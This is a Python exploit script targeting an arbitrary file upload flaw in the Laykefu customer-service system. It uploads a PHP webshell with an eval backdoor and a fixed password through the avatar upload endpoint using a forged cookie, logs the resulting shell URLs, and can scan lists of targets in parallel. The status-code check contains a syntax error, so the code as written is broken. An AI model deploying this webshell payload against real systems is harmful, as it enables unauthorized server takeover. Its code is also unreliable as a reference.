# -*- coding: utf-8 -*-
import argparse
import base64
import re
import sys
import json
from multiprocessing.dummy import Pool

import requests
import urllib3
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def banner():
    test = """
           8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
            Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
             Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
              "8aa8"      88           88,d88'      88 88  `8b   88 88             
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
                88        88           88     "88,  88 88     `888   `"Y88888P"   

                            888888888888 

                                        tag: this is a Laykefu客服系统 任意文件上传漏洞                                      
                                              @version: 1.0.0   @author: Y1_K1NG           
    """
    print(test)


def poc(target):
    if target[-1] == '/':
        target = target[:-1]
    else:
        target = target
    url = target + "/admin/users/upavatar.html"

    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "user_name=1; user_id=3",
        "Connection": "close"
    }

    files = {
        "file": ("1.php", b"<?php phpinfo();@eval($_POST['y1k1ng']);?>", "image/png")
    }

    try:
        response1 = requests.post(url, headers=headers, files=files,verify=False, timeout=15)
        # print(response1.text)
        if response1.status_code = "200":
            data = response1.json()
            if data["msg"] == "ok":
                src = data['data']['src']
                src = src.replace('\\', '')
                url2 = target + src
                print(f"[++++++] {target} 存在 任意文件上传,shell地址为{url2},默认密码为y1k1ng")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(url2 + "\n")
            else:
                print(f"[-] {target} 不存在 任意文件上传")

        else:
            print(f"[-] {target} 请求error")
    except Exception as e:
        print(f"[*] {target} error: {str(e)}")


def extract_host(url):
    """
    从 URL 中提取主机地址和端口号，返回 (host, port)
    """
    match = re.search(r"(http://|https://)?([\w\.]+):?(\d+)?", url)
    if match:
        prefix, host, port = match.groups()
        if not port:
            if prefix and "https" in prefix:
                port = "443"
            else:
                port = "80"
        return host, int(port)
    else:
        return None, None


def main():
    banner()
    parser = argparse.ArgumentParser(description='任何问题+V y1k1ng1227')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()

    if args.url and not args.file:
        if "https://" in args.url or "http://" in args.url:
            url = args.url
        else:
            host, port = extract_host(args.url)
            url = f"http://{host}:{port}"
        poc(url)

    elif args.url is None and args.file is not None:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip().replace("\n", "")
                if "https://" in url or "http://" in url:
                    url = url
                else:
                    host, port = extract_host(url)
                    url = f"http://{host}:{port}"
                url_list.append(url)

        pool = Pool(10)
        pool.map(poc, url_list)
        pool.close()
        pool.join()

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
